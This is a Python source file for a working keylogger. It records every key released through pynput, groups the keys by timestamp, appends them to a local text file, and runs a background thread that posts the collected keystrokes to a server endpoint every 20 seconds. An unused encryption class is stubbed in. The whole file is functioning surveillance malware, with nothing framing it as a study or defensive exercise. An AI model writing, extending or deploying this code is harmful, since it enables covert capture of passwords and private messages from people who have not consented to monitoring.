import time
import requests
import threading
from pynput import keyboard
from pynput.keyboard import Key
from cryptography.fernet import Fernet
import os

class KeyLoggerService:
    def __init__(self):
        self.key_log_dict = {}
        self.all_logs = []

    def add_key(self, key):
        now_time = time.strftime("%d/%m/%y %H:%M", time.localtime())
        if now_time in self.key_log_dict:
            self.key_log_dict[now_time].append(str(key))
        else:
            self.key_log_dict[now_time] = [str(key)]

    def save_and_clear(self):
        if self.key_log_dict:
            self.all_logs.append(self.key_log_dict)
            self.key_log_dict = {}
        return self.all_logs

    def get_logs(self):
        return self.all_logs

class FileWriter:
    @staticmethod
    def write_to_file(key_data):
        with open("key_log.txt", 'a') as log_file:
            for log_dict in key_data:
                for timestamp in log_dict:
                    for key in log_dict[timestamp]:
                        content = f"{timestamp}\n{key}\n"
                        log_file.write(content)

class ServerSender:
    def __init__(self, server_url, service):
        self.server_url = server_url
        self.service = service
        threading.Thread(target=self.send_to_server, daemon=True).start()

    def send_to_server(self):
        while True:
            logs = self.service.get_logs()
            if logs:
                response = requests.post(self.server_url, json=logs)
                print(f"Data sent to server. Response: {response.text}")
            time.sleep(20)

class KeyLoggerManager:
    def __init__(self):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.server_sender = ServerSender("http://localhost:8000/api/key_logs", self.service)
        self.listener = None

    def handle_key_press(self, key):
        self.service.add_key(key)
        if key == Key.space:
            self.service.save_and_clear()
        elif key == Key.esc:
            logs = self.service.save_and_clear()
            self.file_writer.write_to_file(logs)

    def start(self):
        with keyboard.Listener(on_release=self.handle_key_press) as listener:
            self.listener = listener
            listener.join()

class Encrypter:
    pass

if __name__ == "__main__":
    manager = KeyLoggerManager()
    manager.start()